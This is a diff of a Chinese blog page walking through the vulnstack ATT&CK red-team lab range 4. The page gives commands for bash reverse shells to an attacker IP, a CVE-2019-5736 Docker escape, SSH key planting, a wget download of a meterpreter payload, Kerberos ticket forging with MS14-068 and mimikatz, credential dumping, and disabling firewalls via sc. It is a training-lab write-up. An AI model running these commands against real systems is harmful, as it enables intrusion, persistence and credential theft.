@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta name="description" content="地址：vulnstack 12341.st漏洞利用               2.phpmyadmin 4.8.1文件包含  3.tomcat getshell         4.docker逃逸 ssh 免密登录   5.ms14-068 域提权漏洞  	  6.bash 一句话反弹shell     7.sc 服务计划任务           8.token 降权收集信息">
+  <meta name="description" content="地址：vulnstack 1.st漏洞利用               2.phpmyadmin 4.8.1文件包含  3.tomcat getshell         4.docker逃逸 ssh 免密登录   5.ms14-068 域提权漏洞  	  6.bash 一句话反弹shell     7.sc 服务计划任务           8.token 降权收集信息">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ATT&amp;CK红队评估实战靶场（四）">
 <meta property="og:url" content="http://example.com/2021/04/12/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%9B%9B%EF%BC%89/index.html">
 <meta property="og:site_name" content="Y0ng的博客">
-<meta property="og:description" content="地址：vulnstack 12341.st漏洞利用               2.phpmyadmin 4.8.1文件包含  3.tomcat getshell         4.docker逃逸 ssh 免密登录   5.ms14-068 域提权漏洞  	  6.bash 一句话反弹shell     7.sc 服务计划任务           8.token 降权收集信息">
+<meta property="og:description" content="地址：vulnstack 1.st漏洞利用               2.phpmyadmin 4.8.1文件包含  3.tomcat getshell         4.docker逃逸 ssh 免密登录   5.ms14-068 域提权漏洞  	  6.bash 一句话反弹shell     7.sc 服务计划任务           8.token 降权收集信息">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20210412203633962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20210412184052874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
@@ -322,7 +322,7 @@
       
         <p><img src="https://img-blog.csdnimg.cn/20210412203633962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p>地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">vulnstack</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.st漏洞利用               2.phpmyadmin 4.8.1文件包含  </span><br><span class="line">3.tomcat getshell         4.docker逃逸 ssh 免密登录   </span><br><span class="line">5.ms14-068 域提权漏洞  	  6.bash 一句话反弹shell     </span><br><span class="line">7.sc 服务计划任务           8.token 降权收集信息</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.st漏洞利用               2.phpmyadmin 4.8.1文件包含  </span><br><span class="line">3.tomcat getshell         4.docker逃逸 ssh 免密登录   </span><br><span class="line">5.ms14-068 域提权漏洞  	  6.bash 一句话反弹shell     </span><br><span class="line">7.sc 服务计划任务           8.token 降权收集信息</span><br></pre></td></tr></table></figure>
 
 <a id="more"></a>
 
@@ -412,16 +412,16 @@
 <hr>
 <h1 id="反弹Docker-shell"><a href="#反弹Docker-shell" class="headerlink" title="反弹Docker shell"></a>反弹Docker shell</h1><h2 id="判断Docker环境"><a href="#判断Docker环境" class="headerlink" title="判断Docker环境"></a>判断Docker环境</h2><p>实战中首先需要判断服务器是否为docker环境。</p>
 <p>常用的判断方法有两种。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">是否存在.dockerenv文件:</span><br><span class="line">docker环境下存在：ls -alh &#x2F;.dockerenv 文件</span><br><span class="line"></span><br><span class="line">查询系统进程的cgroup信息:</span><br><span class="line">docker环境下 cat &#x2F;proc&#x2F;1&#x2F;cgroup</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">是否存在.dockerenv文件:</span><br><span class="line">docker环境下存在：ls -alh &#x2F;.dockerenv 文件</span><br><span class="line"></span><br><span class="line">查询系统进程的cgroup信息:</span><br><span class="line">docker环境下 cat &#x2F;proc&#x2F;1&#x2F;cgroup</span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/20210412190752927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <h2 id="bash-一句话"><a href="#bash-一句话" class="headerlink" title="bash 一句话"></a>bash 一句话</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43221560/article/details/112436499">bash 反弹shell 一句话原理</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.47.128&#x2F;9999 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.47.128&#x2F;9999 2&gt;&amp;1 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -i &lt; &#x2F;dev&#x2F;tcp&#x2F;192.168.47.128&#x2F;9999 2&gt;&amp;0 1&gt;&amp;0</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.47.128&#x2F;9999 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.47.128&#x2F;9999 2&gt;&amp;1 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -i &lt; &#x2F;dev&#x2F;tcp&#x2F;192.168.47.128&#x2F;9999 2&gt;&amp;0 1&gt;&amp;0</span><br></pre></td></tr></table></figure>
 
 <p>bash一句话生成shell.sh</p>
 <p>冰蝎上传 shell.sh </p>
 <p>Kali开启监听，同时运行shell.sh</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x shell.sh   &#x2F;&#x2F;添加可执行</span><br><span class="line">bash shell.sh     &#x2F;&#x2F;运行</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x shell.sh   &#x2F;&#x2F;添加可执行</span><br><span class="line">bash shell.sh     &#x2F;&#x2F;运行</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210412191024124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
@@ -467,14 +467,14 @@
 <p>Poc地址：<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
 <p>下载后修改payload为bash一句话 反弹shell：</p>
 <p><img src="https://img-blog.csdnimg.cn/20210412192054608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>编译生成payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile   &#x2F;&#x2F;配置go环境</span><br><span class="line"></span><br><span class="line">CGO_ENABLED&#x3D;0 GOOS&#x3D;linux GOARCH&#x3D;amd64 go build main.go  &#x2F;&#x2F;编译生成</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile   &#x2F;&#x2F;配置go环境</span><br><span class="line"></span><br><span class="line">CGO_ENABLED&#x3D;0 GOOS&#x3D;linux GOARCH&#x3D;amd64 go build main.go  &#x2F;&#x2F;编译生成</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/2021041219224023.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>上传main：</p>
 <p>可以使用冰蝎，也可以使用msf会话上传，且需要赋予权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload &#x2F;home&#x2F;cys121&#x2F;桌面&#x2F;CVE-2019-5736-PoC&#x2F;main &#x2F;home</span><br><span class="line"></span><br><span class="line">chmod 777 &#x2F;home&#x2F;main</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload &#x2F;home&#x2F;cys121&#x2F;桌面&#x2F;CVE-2019-5736-PoC&#x2F;main &#x2F;home</span><br><span class="line"></span><br><span class="line">chmod 777 &#x2F;home&#x2F;main</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210412192354586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br> 执行payload，同时 nc 监听7777</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;main   &#x2F;&#x2F;运行payload</span><br><span class="line">nc -lvp 7777  &#x2F;&#x2F;监听</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;main   &#x2F;&#x2F;运行payload</span><br><span class="line">nc -lvp 7777  &#x2F;&#x2F;监听</span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/2021041219245798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>payload需要重启docker才可以触发：模拟重启容器：</p>
 <blockquote>
 <p>docker exec -it 09dd4e5bfa91 /bin/bash</p>
@@ -502,7 +502,7 @@
 <p><img src="https://img-blog.csdnimg.cn/20210412193130908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <h3 id="生成秘钥"><a href="#生成秘钥" class="headerlink" title="生成秘钥"></a>生成秘钥</h3><p>这时在攻击机本地生成 <code>ssh秘钥文件</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f cyshack  </span><br><span class="line"></span><br><span class="line">chmod 600 cyshack  &#x2F;&#x2F;对cyshack赋权，只有拥有者有读写权限。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -f cyshack  </span><br><span class="line"></span><br><span class="line">chmod 600 cyshack  &#x2F;&#x2F;对cyshack赋权，只有拥有者有读写权限。</span><br></pre></td></tr></table></figure>
 
 <p>就会生成一个秘钥文件：</p>
 <p><img src="https://img-blog.csdnimg.cn/20210412193324848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20210412193333112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
@@ -512,18 +512,18 @@
 <p>ls /cyshack/home/ubuntu -l -a  //利用的就是这个.ssh目录</p>
 </blockquote>
 <p><img src="https://img-blog.csdnimg.cn/20210412193613854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20210412193625981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>将 ssh秘钥 写入到.ssh目录里面并将文件命名为<code>authorized_keys</code> (目标机<code>.ssh目录权限为700</code>)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cp -avx &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys </span><br><span class="line">&#x2F;&#x2F; -avx 将权限也一起复制</span><br><span class="line"></span><br><span class="line">echo &gt; authorized_keys  &#x2F;&#x2F;将内容清空</span><br><span class="line"></span><br><span class="line">echo ‘kali生成的.pub内容’ &gt; authorized_keys  &#x2F;&#x2F;将ssh秘钥写入</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp -avx &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys </span><br><span class="line">&#x2F;&#x2F; -avx 将权限也一起复制</span><br><span class="line"></span><br><span class="line">echo &gt; authorized_keys  &#x2F;&#x2F;将内容清空</span><br><span class="line"></span><br><span class="line">echo ‘kali生成的.pub内容’ &gt; authorized_keys  &#x2F;&#x2F;将ssh秘钥写入</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210412193853420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20210412193903604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <h3 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h3><p>此时，可以利用自己的私钥进行免密码登录目标宿主机</p>
 <blockquote>
-<p>ssh -i cyshack <a href="mailto:&#117;&#x62;&#117;&#110;&#116;&#x75;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x34;&#x37;&#x2e;&#49;&#x33;&#x36;">&#117;&#x62;&#117;&#110;&#116;&#x75;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x34;&#x37;&#x2e;&#49;&#x33;&#x36;</a></p>
+<p>ssh -i cyshack <a href="mailto:&#x75;&#x62;&#117;&#110;&#116;&#x75;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#x34;&#55;&#x2e;&#x31;&#x33;&#x36;">&#x75;&#x62;&#117;&#110;&#116;&#x75;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#x34;&#55;&#x2e;&#x31;&#x33;&#x36;</a></p>
 </blockquote>
 <p><img src="https://img-blog.csdnimg.cn/202104121940194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <h1 id="反弹宿主机权限到MSF"><a href="#反弹宿主机权限到MSF" class="headerlink" title="反弹宿主机权限到MSF"></a>反弹宿主机权限到MSF</h1><p>还是可以用wget进行下载木马，在msf设置监听获取meterpreter</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer &#x2F;&#x2F;启动web服务</span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;192.168.47.128:8000&#x2F;shell.elf</span><br><span class="line"></span><br><span class="line">Chmod 777 shell.elf   &#x2F;&#x2F;权限</span><br><span class="line"></span><br><span class="line">.&#x2F;shell.elf     &#x2F;&#x2F;执行</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer &#x2F;&#x2F;启动web服务</span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;192.168.47.128:8000&#x2F;shell.elf</span><br><span class="line"></span><br><span class="line">Chmod 777 shell.elf   &#x2F;&#x2F;权限</span><br><span class="line"></span><br><span class="line">.&#x2F;shell.elf     &#x2F;&#x2F;执行</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210412194353396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20210412194459671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
@@ -541,7 +541,7 @@
 <hr>
 <h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="token-降权"><a href="#token-降权" class="headerlink" title="token 降权"></a>token 降权</h2><p>为了方便信息收集，将当前权限<code>降为普通域用户</code>，因为不是域用户没有权限执行域命令</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/111926058">通过token窃取实现降权或者提权</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getuid &#x2F;&#x2F;查看当前token</span><br><span class="line">use incognito &#x2F;&#x2F;加载incognito</span><br><span class="line">list_tokens -u &#x2F;&#x2F;列出accesstoken</span><br><span class="line">impersonate_token &quot;DEMO\douser&quot;  &#x2F;&#x2F;模拟&quot;DEMO\douser”用户</span><br><span class="line">rev2self  &#x2F;&#x2F;返回之前的accesstoken权限</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getuid &#x2F;&#x2F;查看当前token</span><br><span class="line">use incognito &#x2F;&#x2F;加载incognito</span><br><span class="line">list_tokens -u &#x2F;&#x2F;列出accesstoken</span><br><span class="line">impersonate_token &quot;DEMO\douser&quot;  &#x2F;&#x2F;模拟&quot;DEMO\douser”用户</span><br><span class="line">rev2self  &#x2F;&#x2F;返回之前的accesstoken权限</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210412195147240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
@@ -555,7 +555,7 @@
 <p>192.168.183.130</p>
 <p><img src="https://img-blog.csdnimg.cn/20210412195653963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>密码收集：</p>
 <p>提权</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br><span class="line">得到域用户   douser：Dotest123</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br><span class="line">得到域用户   douser：Dotest123</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h1 id="进攻域控"><a href="#进攻域控" class="headerlink" title="进攻域控"></a>进攻域控</h1><h2 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h2><p>失败</p>
@@ -576,7 +576,7 @@
 <hr>
 <p>三、<strong>伪造生成票据</strong></p>
 <p>上传ms14-068.exe (github)，生成TGT票据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ms14-068.exe -u 域成员名@域名.com -s 域成员sid -d 域控制器ip地址 -p 域成员密码</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ms14-068.exe -u 域成员名@域名.com -s 域成员sid -d 域控制器ip地址 -p 域成员密码</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/2021041220062910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>如图成功生成票据文件<code>TGT_douser@DEMO.com.ccache</code></p>
 <hr>
@@ -584,7 +584,7 @@
 <blockquote>
 <p>利用mimikatz注入票据，将票据伪造到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge &#x2F;&#x2F;清空当前机器中所有凭证</span><br><span class="line">kerberos::list  &#x2F;&#x2F;查看当前机器凭证</span><br><span class="line">kerberos::ptc TGT_douser@DEMO.com.ccache &#x2F;&#x2F;将票据注入到内存中</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::purge &#x2F;&#x2F;清空当前机器中所有凭证</span><br><span class="line">kerberos::list  &#x2F;&#x2F;查看当前机器凭证</span><br><span class="line">kerberos::ptc TGT_douser@DEMO.com.ccache &#x2F;&#x2F;将票据注入到内存中</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/202104122009004.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>查看是否注入成功：</p>
 <blockquote>
@@ -599,7 +599,7 @@
 <p>如果是ip则不能访问</p>
 <p><img src="https://img-blog.csdnimg.cn/20210412201056720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
-<h1 id="获取域控权限"><a href="#获取域控权限" class="headerlink" title="获取域控权限"></a>获取域控权限</h1><h2 id="sc服务关闭防火墙"><a href="#sc服务关闭防火墙" class="headerlink" title="sc服务关闭防火墙"></a>sc服务关闭防火墙</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N start unablefirewall</span><br></pre></td></tr></table></figure>
+<h1 id="获取域控权限"><a href="#获取域控权限" class="headerlink" title="获取域控权限"></a>获取域控权限</h1><h2 id="sc服务关闭防火墙"><a href="#sc服务关闭防火墙" class="headerlink" title="sc服务关闭防火墙"></a>sc服务关闭防火墙</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N start unablefirewall</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210412201235892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
@@ -613,7 +613,7 @@
 </blockquote>
 <p><img src="https://img-blog.csdnimg.cn/20210412201804297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
-<h2 id="执行木马"><a href="#执行木马" class="headerlink" title="执行木马"></a>执行木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create ma binpath&#x3D; &quot;c:\ma.exe&quot;  &#x2F;&#x2F;创建服务</span><br><span class="line"></span><br><span class="line">sc \\WIN-ENS2VR5TR3N start ma  &#x2F;&#x2F;执行服务</span><br></pre></td></tr></table></figure>
+<h2 id="执行木马"><a href="#执行木马" class="headerlink" title="执行木马"></a>执行木马</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create ma binpath&#x3D; &quot;c:\ma.exe&quot;  &#x2F;&#x2F;创建服务</span><br><span class="line"></span><br><span class="line">sc \\WIN-ENS2VR5TR3N start ma  &#x2F;&#x2F;执行服务</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210412202045964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
@@ -621,11 +621,11 @@
 <p>直接getsystem提升权限获取密码结果什么都没有</p>
 <p><img src="https://img-blog.csdnimg.cn/20210412202135647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>降权上传mimikatz</p>
